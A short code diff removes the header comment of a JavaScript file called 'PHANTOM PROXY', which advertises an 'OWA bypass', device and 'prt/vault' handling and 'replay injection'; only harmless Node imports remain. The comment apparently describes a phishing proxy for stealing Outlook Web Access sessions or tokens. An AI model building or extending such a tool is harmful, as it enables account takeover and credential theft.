@@ -1,10 +1,3 @@
-// ============================================================
-// 🥔 PHANTOM PROXY v11.35 — FULL FIX FOR GET DEST + REAL OWA BYPASS
-// ============================================================
-// Includes: global rewriteUrl, redirect headers, SW, HTML/JS rewrite,
-// GET dest param parsing, device/prt/vault, and replay injection.
-// ============================================================
-
 const http = require("http");
 const https = require("https");
 const path = require("path");
